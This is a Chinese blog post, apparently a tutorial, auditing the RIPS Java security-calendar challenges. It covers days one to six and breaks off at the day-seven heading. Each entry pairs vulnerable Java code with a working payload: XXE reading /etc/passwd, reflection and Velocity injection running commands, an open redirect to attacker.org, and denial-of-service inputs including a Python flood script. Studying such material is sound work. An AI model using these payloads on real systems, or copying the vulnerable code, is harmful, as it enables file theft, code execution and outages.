<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Java代码审计(一)"><meta name="keywords" content="Java"><meta name="author" content="Sys71m"><meta name="copyright" content="Sys71m"><title>Java代码审计(一) | sys71m</title><link rel="shortcut icon" href="/lufei.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><link rel="alternate" href="/atom.xml" title="sys71m" type="application/atom+xml">
</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#项目地址"><span class="toc-number">1.</span> <span class="toc-text">项目地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-1-Candy-Cane之XXE攻击"><span class="toc-number">2.</span> <span class="toc-text">Day 1 - Candy Cane之XXE攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-2-Eggnog-Madness之任意对象实例化"><span class="toc-number">3.</span> <span class="toc-text">Day 2 - Eggnog Madness之任意对象实例化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-3-Christmas-Carols之Velocity模版注入"><span class="toc-number">4.</span> <span class="toc-text">Day 3 - Christmas Carols之Velocity模版注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-4-Father-Christmas之任意重定向"><span class="toc-number">5.</span> <span class="toc-text">Day 4 - Father Christmas之任意重定向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-5-Wintertime之拒绝服务攻击"><span class="toc-number">6.</span> <span class="toc-text">Day 5 - Wintertime之拒绝服务攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-6-Yule之拒绝服务攻击"><span class="toc-number">7.</span> <span class="toc-text">Day 6 - Yule之拒绝服务攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-7-Jingle-Bells之伪造提权"><span class="toc-number">8.</span> <span class="toc-text">Day 7 - Jingle Bells之伪造提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-8-Icicles之未授权下载"><span class="toc-number">9.</span> <span class="toc-text">Day 8 - Icicles之未授权下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-9-Chestnuts之ReDos"><span class="toc-number">10.</span> <span class="toc-text">Day 9 - Chestnuts之ReDos</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-10-Anticipation之XML响应中的XSS"><span class="toc-number">11.</span> <span class="toc-text">Day 10 - Anticipation之XML响应中的XSS</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/lufei.jpg"></div><div class="author-info__name text-center">Sys71m</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/ttonys">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">33</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">48</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">18</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://raw.githubusercontent.com/ttonys/MarkDownPic/master/test33.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">sys71m</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">Java代码审计(一)</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-08</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/代码审计/">代码审计</a><span class="post-meta__separator">|</span><i class="fa fa-comment-o post-meta__icon" aria-hidden="true"></i><a href="/2020/02/08/Java代码审计(一)/#disqus_thread"><span class="disqus-comment-count" data-disqus-identifier="2020/02/08/Java代码审计(一)/"></span></a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">2.9k</span><span class="post-meta__separator">|</span><span>Reading time: 12 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>通过一些典型的Java代码来分析易产生漏洞的点，入门篇。。。</p>
<a id="more"></a>  
<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://www.ripstech.com/java-security-calendar-2019/</span></span><br></pre></td></tr></table></figure>
<h2 id="Day-1-Candy-Cane之XXE攻击"><a href="#Day-1-Candy-Cane之XXE攻击" class="headerlink" title="Day 1 - Candy Cane之XXE攻击"></a>Day 1 - Candy Cane之XXE攻击</h2><p>漏洞代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.jdom2.Content;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.Document;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.JDOMException;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.input.SAXBuilder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ImportDocument</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">extractString</span><span class="params">()</span> <span class="keyword">throws</span> IOException, JDOMException </span>&#123;</span><br><span class="line">    File initialFile = <span class="keyword">new</span> File(<span class="string">"uploaded_office_doc.odt"</span>);</span><br><span class="line">    InputStream in = <span class="keyword">new</span> FileInputStream(initialFile);</span><br><span class="line">    <span class="keyword">final</span> ZipInputStream zis = <span class="keyword">new</span> ZipInputStream(in);</span><br><span class="line">    ZipEntry entry;</span><br><span class="line">    List&lt;Content&gt; content = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">while</span> ((entry = zis.getNextEntry()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (entry.getName().equals(<span class="string">"content.xml"</span>)) &#123;</span><br><span class="line">        <span class="keyword">final</span> SAXBuilder sax = <span class="keyword">new</span> org.jdom2.input.SAXBuilder();</span><br><span class="line">        sax.setFeature(<span class="string">"http://javax.xml.XMLConstants/feature/secure-processing"</span>,<span class="keyword">true</span>);</span><br><span class="line">        Document doc = sax.build(zis);</span><br><span class="line">        content = doc.getContent();</span><br><span class="line">        zis.close();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">if</span> (content != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span>(Content item : content)&#123;</span><br><span class="line">        sb.append(item.getValue());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>手册：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.jdom.org/docs/apidocs/</span><br></pre></td></tr></table></figure>
<p>查看手册可知，<code>SAXBuilder</code>类主要对xml文件进行解析，当解析的内容可控时可构造恶意的xml文件进行xxe攻击。代码中通过读取<code>uploaded_office_doc.odt</code>文件（实际上也是一个ZIP文件），进行遍历判断是否存在<code>content.xml</code>文件，存在的话则对xml文件进行解析。</p>
<p>构造如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">    &lt;!ELEMENT text ANY &gt;</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="Day-2-Eggnog-Madness之任意对象实例化"><a href="#Day-2-Eggnog-Madness之任意对象实例化" class="headerlink" title="Day 2 - Eggnog Madness之任意对象实例化"></a>Day 2 - Eggnog Madness之任意对象实例化</h2><p>漏洞代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.json.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainController</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> String[] parseJsonAsArray(String rawJson, String field) &#123;</span><br><span class="line">    JSONObject obj = <span class="keyword">new</span> JSONObject(rawJson);</span><br><span class="line">    JSONArray arrJson = obj.getJSONArray(field);</span><br><span class="line">    String[] arr = <span class="keyword">new</span> String[arrJson.length()];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arrJson.length(); i++) &#123;</span><br><span class="line">      arr[i] = arrJson.getString(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">parseJsonAsString</span><span class="params">(String rawJson, String field)</span> </span>&#123;</span><br><span class="line">    JSONObject obj = <span class="keyword">new</span> JSONObject(rawJson);</span><br><span class="line">    <span class="keyword">return</span> obj.getString(field);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">MainController</span><span class="params">(String rawJson)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(parseJsonAsString(rawJson, <span class="string">"controller"</span>), parseJsonAsString(rawJson, <span class="string">"task"</span>), parseJsonAsArray(rawJson, <span class="string">"data"</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">MainController</span><span class="params">(String controllerName, String task, String... data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Object controller = !controllerName.equals(<span class="string">"MainController"</span>) ? Class.forName(controllerName).getConstructor(String[].class).newInstance((Object) data) : <span class="keyword">this</span>;</span><br><span class="line">      System.out.println(controller.getClass().getMethod(task));</span><br><span class="line">      controller.getClass().getMethod(task).invoke(controller);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e1) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        String log = <span class="string">"# [ERROR] Exception with data: "</span> + data + <span class="string">" with exception "</span> + e1;</span><br><span class="line">        System.err.println(log);</span><br><span class="line">       </span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"java"</span>, <span class="string">"-jar"</span>, <span class="string">"log4j_custom_dlogger.jar"</span>, log.replaceAll(<span class="string">"."</span>, <span class="string">""</span>)&#125;);</span><br><span class="line">        </span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e2) &#123;</span><br><span class="line">        System.err.println(<span class="string">"FATAL ERROR: "</span> + e2);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码不是很长，大致逻辑为判断传入参数是否为<code>MainController</code>，是的话则直接对<code>Object</code>赋值，不再进行实例化，不是的话根据传入的控制器名进行实例化并调用任意方法。由于参数可控，则可对任意对象进行实例化并调用其函数。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rawJson=&#123;&quot;controller&quot;:&quot;java.lang.ProcessBuilder&quot;,&quot;task&quot;:&quot;start&quot;,&quot;data&quot;:[&quot;touch&quot;,&quot;hacked.jsp&quot;]&#125;</span><br></pre></td></tr></table></figure>
<p>此类用于创建操作系统进程。每个<code>ProcessBuilder</code>实例管理一个进程属性集。<code>start()</code>方法利用这些属性创建一个新的 <code>Process</code>实例。</p>
<h2 id="Day-3-Christmas-Carols之Velocity模版注入"><a href="#Day-3-Christmas-Carols之Velocity模版注入" class="headerlink" title="Day 3 - Christmas Carols之Velocity模版注入"></a>Day 3 - Christmas Carols之Velocity模版注入</h2><p>漏洞代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.app.VelocityEngine;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplateRenderer</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> VelocityEngine velocity;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">renderFragment</span><span class="params">(String fragment, Map&lt;String,Object&gt; contextParameters)</span> </span>&#123;</span><br><span class="line">    velocity = <span class="keyword">new</span> VelocityEngine();</span><br><span class="line">    velocity.init();</span><br><span class="line">    VelocityContext context =  <span class="keyword">new</span> VelocityContext(contextParameters);</span><br><span class="line">    StringWriter tempWriter = <span class="keyword">new</span> StringWriter(fragment.length());</span><br><span class="line">    velocity.evaluate(context, tempWriter, <span class="string">"renderFragment"</span>, fragment);</span><br><span class="line">    <span class="keyword">return</span> tempWriter.toString();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">render</span><span class="params">(HttpServletRequest req, HttpServletResponse res)</span> </span>&#123;</span><br><span class="line">    Map&lt;String, Object&gt; hm = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">    hm.put(<span class="string">"user"</span>, req.getParameter(<span class="string">"user"</span>));</span><br><span class="line">    String template = req.getParameter(<span class="string">"temp"</span>);</span><br><span class="line">    String rendered = renderFragment(template,hm);</span><br><span class="line">    res.getWriter().println(rendered);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Velocity模板引擎非常强大。你可以在模板中使用条件判断，循环，外部函数调用等逻辑代码。它里面也没有一个沙箱去限制操作。一个恶意的用户如果可以控制模板，那么他就可以在服务器端运行恶意代码。</p>
<p>代码中的velocity.evaluate()函数，用来在运行时动态解析模版语言，因此，若传入的是Java代码，即可执行Java代码。而fragment参数是可由攻击者控制的，fragment参数值会被Velocity当作Java代码执行，因此可导致代码注入漏洞。</p>
<p>这种模版注入的限制是攻击者不能执行Java代码。因此，需要使用Java反射机制来访问Java类最终达到执行任意命令。</p>
<p><strong>Java反射</strong>机制是指在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性。这种动态获取信息以及动态调用对象的方法的功能称为java语言的反射机制。</p>
<p>Velocity指令以#开头，后面跟一个关键字，例如<code>#set</code>指令，其功能是向一个变量或属性赋值。首先将一个变量<code>$s</code>赋值为空，即<code>#set($s=&quot;&quot;)</code>，然后再向一个变量<code>$stringClass</code>赋值为前一个变量的对象调用,获取基类，这个基类有<code>Java.lang.Runtime</code>的类对象。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&amp;temp=#set($s=&quot;&quot;)#set($stringClass=$s.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch hacked.jsp&quot;))$stringClass</span><br></pre></td></tr></table></figure>
<h2 id="Day-4-Father-Christmas之任意重定向"><a href="#Day-4-Father-Christmas之任意重定向" class="headerlink" title="Day 4 - Father Christmas之任意重定向"></a>Day 4 - Father Christmas之任意重定向</h2><p>漏洞代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Login</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">    String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">    <span class="keyword">if</span> (url.startsWith(<span class="string">"/"</span>)) &#123;</span><br><span class="line">      response.sendRedirect(url);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码中url参数是由攻击者可控的，然后在经过<code>startsWith(&quot;/&quot;)</code>的判断后，进行<code>endRedirect()</code>函数进行跳转。本来<code>startsWith(&quot;/&quot;)</code>的判断是为了保证跳转的url是一个相对路径在本域下，然而以/开头的url并非只有相对路径才可以，例如<code>//attacker.org</code>是一个不带scheme的绝对路径URI，在进行跳转时，会直接跳转到<code>http://attacker.org</code></p>
<p>payload：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=//attacker.org</span><br></pre></td></tr></table></figure>
<h2 id="Day-5-Wintertime之拒绝服务攻击"><a href="#Day-5-Wintertime之拒绝服务攻击" class="headerlink" title="Day 5 - Wintertime之拒绝服务攻击"></a>Day 5 - Wintertime之拒绝服务攻击</h2><p>漏洞代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.util.Enumeration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Request</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">toString</span><span class="params">(HttpServletRequest req)</span> </span>&#123;</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    String delimiter = req.getParameter(<span class="string">"delim"</span>);</span><br><span class="line">    Enumeration&lt;String&gt; names = req.getParameterNames();</span><br><span class="line">    <span class="keyword">while</span> (names.hasMoreElements()) &#123;</span><br><span class="line">      String name = names.nextElement();</span><br><span class="line">      <span class="keyword">if</span> (!name.equals(<span class="string">"delim"</span>)) &#123;</span><br><span class="line">        sb.append(<span class="string">"&lt;b&gt;"</span> + name + <span class="string">"&lt;/b&gt;:&lt;br&gt;"</span>);</span><br><span class="line">        String[] values = req.getParameterValues(name);</span><br><span class="line">        <span class="keyword">for</span> (String val : values) &#123;</span><br><span class="line">          sb.append(val);</span><br><span class="line">          sb.append(delimiter);</span><br><span class="line">          sb.append(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码的第6行实例化了<code>StringBuilder</code>对象，<code>StringBuilder</code>是可变对象，用来高效拼接字符串；默认情况下，<code>StringBuilder</code>对象初始化为大小为16的数组。每次追加新值时，<code>StringBuilder</code>实例都会检查数据是否适合数组。否则，数组的大小将加倍。在这种情况下，会有一个大的放大，这会导致Java堆耗尽内存。默认情况下，<code>Apache Tomcat</code>对POST请求具有2MB限制，最大参数为10000个参数。如果我们将参数Delm（例如，1.8 MB）与一个具有多个（例如10000个）HTTP参数的数组结合起来的值非常大，则考虑到StrugBuuDER内部结构，我们可以最大限度地扩大因子~（20000）。</p>
<p>payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://localhost:8080/day5"</span></span><br><span class="line">delim = <span class="string">""</span></span><br><span class="line">A=[]</span><br><span class="line">data=<span class="string">"delim="</span>+delim</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30000</span>):</span><br><span class="line">    delim = delim+<span class="string">'------------------------------------------------'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">300</span>):</span><br><span class="line">    A.append(<span class="string">"test_the_DoS"</span>)</span><br><span class="line">    data=data+<span class="string">"&amp;A&#123;index&#125;="</span>.format(index=i)+A[i<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">header=&#123;<span class="string">'content-type'</span>:<span class="string">"application/x-www-form-urlencoded"</span>&#125;</span><br><span class="line">res=requests.post(url=url,data=data,headers=header)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<h2 id="Day-6-Yule之拒绝服务攻击"><a href="#Day-6-Yule之拒绝服务攻击" class="headerlink" title="Day 6 - Yule之拒绝服务攻击"></a>Day 6 - Yule之拒绝服务攻击</h2><p>漏洞代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReadFile</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">      String data = <span class="keyword">new</span> String(Files.readAllBytes(Paths.get(url)));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">      PrintWriter out = response.getWriter();</span><br><span class="line">      out.print(<span class="string">"File not found"</span>);</span><br><span class="line">      out.flush();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>阅读代码可以看出，通过<code>url</code>参数来获取文件路径，并读取文件的内容，但内容无法返回客户端，无法造成任意文件读取，但路径可控，可以读取<code>/dev/random</code>来造成拒绝服务攻击。</p>
<p><code>/dev/random</code>在<a href="https://zh.wikipedia.org/wiki/类UNIX系统" target="_blank" rel="noopener">类UNIX系统</a>中是一个特殊的<a href="https://zh.wikipedia.org/wiki/设备文件" target="_blank" rel="noopener">设备文件</a>，可以用作<a href="https://zh.wikipedia.org/wiki/随机数发生器" target="_blank" rel="noopener">随机数发生器</a>或<a href="https://zh.wikipedia.org/w/index.php?title=伪随机数发生器&amp;action=edit&amp;redlink=1" target="_blank" rel="noopener">伪随机数发生器</a>。在访问这个文件是可一直读取，并最终导致IOException处理程序无法捕获的内存耗尽。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=/dev/random</span><br></pre></td></tr></table></figure>
<h2 id="Day-7-Jingle-Bells之伪造提权"><a href="#Day-7-Jingle-Bells之伪造提权" class="headerlink" title="Day 7 - Jingle Bells之伪造提权"></a>Day 7 - Jingle Bells之伪造提权</h2><p>漏洞代码：</p>
